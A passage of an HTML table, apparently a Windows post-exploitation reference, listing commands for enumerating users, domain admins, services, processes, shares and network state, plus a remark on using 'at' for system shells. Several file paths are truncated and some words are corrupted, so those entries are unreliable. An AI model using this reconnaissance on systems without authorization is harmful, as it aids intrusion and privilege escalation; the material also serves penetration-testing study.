-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%.ini</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">This is another file to look for if boot.ini isn’t there or coming back, which is some times the case.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SYSTEMROOT%</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">It stores users’ passwords in a hashed format (in</span><span style="font-size: small;"><a href="https://secure.wikimedia.org/wikipedia/en/wiki/LM_hash"><span style="background-color: transparent; color: black; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"> </span><span style="background-color: transparent; color: #000099; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: underline; vertical-align: baseline;">LM hash</span></a></span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"> and</span><span style="font-size: small;"><a href="https://secure.wikimedia.org/wikipedia/en/wiki/NTLM"><span style="background-color: transparent; color: black; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"> </span><span style="background-color: transparent; color: #000099; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: underline; vertical-align: baseline;">NTLM</span></a></span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"> hash).</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SYSTEMROOT%</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">&gt;insert new rows above this line&lt;</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">SEE IMPORTANT FILES SECTION FOR MORE IDEAS</span>
-</td></tr>
-</tbody></table>
-
-<h2 id="system"><a href="#TOC">System</a></h2>
-<table style="border-collapse: collapse; border: medium none;">
-<colgroup><col width="334"></col><col width="338"></col></colgroup>
-<tbody>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Command</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Expected Output or Description</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">whoami</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists your current user. Not present in all versions of Windows; however shall be present in Windows NT 6.0-6.1.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">whoami /all</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists current user, sid, groups current user is a member of and their sids as well as current privilege level.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">set</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Shows all current environmental variables. Specific ones to look for are USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA, and ALLUSERPROFILE.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">systeminfo (XP+)</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Outputs a large amount of data about the sytem, including hostname, domain, logon server, time zone, network interface config, and hotfixes installed</span>
-</td></tr>
-<tr style="height: 60px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">qwinsta</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: italic; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">(2000/NT4 with Terminal Services; XP and above)</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Displaying information about RDP sessions. /CONNECT can be added, but usually not. needed to gain the information you need.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">qprocess *</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Much like tasklist, but a bit easier to read. It has username, login mqappsrvethod, session id, pid, and binary name. </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">lists Terminal Services servers</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">at</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Shows currently scheduled tasks via ‘at’. Even though schtasks is the new way of doing things admin wise, pentesters can still use ‘at’ to get system level shells even through Win7x64 systems.</span>
-</td></tr>
-<tr style="height: 89px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">schtasks (XP+)</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists all the currently scheduled tasks that your current user has access to see. This is the big deviation from ‘at’. Each user can have their own scheduled tasks now.</span>
-</td></tr>
-<tr style="height: 43px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">schtasks /query /fo csv /v &gt; %TEMP%</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Outputs the list of services in verbose csv format. Good for throwing in temp and pulling down for a more closer look.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net start</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">OR</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">sc query</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists services</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">-&gt; sc getkeyname “XXXXX”</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">You can use the name you got from ‘net start’ to get the ‘key name’ of the service you want more information on.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">–&gt; sc queryex “XXXXX”</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Using the keyname you achieved from ‘getkeyname’, you can query the status, pid and other information about the service.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net config workstation</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">This will display information such as NetBIOS name, the full computer name, Username (of the user executing this command), Domain, Workgroups, and more.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net time</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net file</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net session</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net use</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Used to map network shares, such as the C: drive.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">tasklist (XP+)</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Is equivalent to using Taskmanager, though visible as console output instead with PID’s too.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">tasklist /m  or tasklist /m blah.dll</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists all of the ‘modules’ (binary (exe, dll, com or any other PE based code that was executed) for each psportsportrocess, or if a module is specified then tasklist will only list the processes with that specific module running. Great for finding processes running crypto or other specific function dlls</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">tasklist /svc</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists processes and their accompanying service </span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">keyname if they are parented by a service</span>
-</td></tr>
-<tr style="height: 56px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">taskkill [/f] /pid &lt;pid&gt;</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">taskkill [/f] /im &lt;image_name&gt;</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Kill processes by name or pid (with force option)</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">fsutil fsinfo drives</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Must be an administrator to run this, but it list the current drives on the system.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: white; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">reg query HKLM /s /d /f “C:* *.exe” | find /I “C:&quot; | find /V”“”&quot;</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Locates insecurely registered executablea within the system registry on Windows 7. </span>
-</td></tr>
-</tbody></table>
-
-<h2 id="networking-ipconfig-netstat-net"><a href="#TOC">Networking (ipconfig, netstat, net)</a></h2>
-<table style="border-collapse: collapse; border: medium none;">
-<colgroup><col width="333"></col><col width="339"></col></colgroup>
-<tbody>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Command</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Expected Output or Description</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">ipconfig /all</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Displays the full information about your NIC’s.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">ipconfig /displaydns</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Displays your local DNS cache.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -nabo</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -s -p [tcp|udp|icpm|ip]</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -r</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -na | findstr :445</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -nao | findstr LISTENING</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">XP and up for -o flag to get PID</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -nao | findstr LISTENING</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">XP and up for -o flag to get PID</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netstat -na | findstr LISTENING</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">netsh diag show all</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net view</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Queries NBNS/SMB (SAMBA) and tries to find all hosts in your current workgroup.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net view /domain</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net view /domain:otherdomain</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net user %USERNAME% /domain</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Pulls information on the current user, if they are a domain user. If you are a local user then you just drop the /domain. Important things to note are login times, last time changed password, logon scripts, and group membership</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net user /domain</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists all of the domain users</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net accounts</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the password policy for the local system. This can be different and superseded by the domain policy.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net accounts /domain</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the password policy for the domain</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net localgroup administrators</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the members of the Administrators local group</span>
-</td></tr>
-<tr style="height: 73px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net localgroup administrators /domain</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">as this was supposed to use localgroup &amp; domain, this actually another way of getting <em>current</em> domain admins</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net group “Domain Admins” /domain</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the members of the Domain Admins group</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net group “Enterprise Admins” /domain</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the members of the Enterprise Admins group</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net group “Domain Controllers” /domain</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the list of Domain Controllers for the current domain</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">nbtstat -a [ip here]</span>
